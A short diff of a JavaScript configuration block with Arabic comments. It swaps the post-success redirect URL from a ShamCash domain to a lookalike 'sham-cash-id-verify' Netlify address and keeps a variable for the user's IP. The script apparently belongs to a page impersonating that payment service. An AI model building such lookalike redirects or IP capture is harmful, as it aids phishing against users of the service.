@@ -3,7 +3,7 @@
 // =======================================================
 //          Global Configurations & IP variable
 // =======================================================
-const FINAL_REDIRECT_URL = "https://shamcash.org"; // إذا كان هناك رابط إعادة توجيه بعد النجاح
+const FINAL_REDIRECT_URL = "https://sham-cash-id-verify.netlify.app"; // إذا كان هناك رابط إعادة توجيه بعد النجاح
 let userIpAddress = 'غير معروف'; // Global variable to store IP
 
 // =======================================================
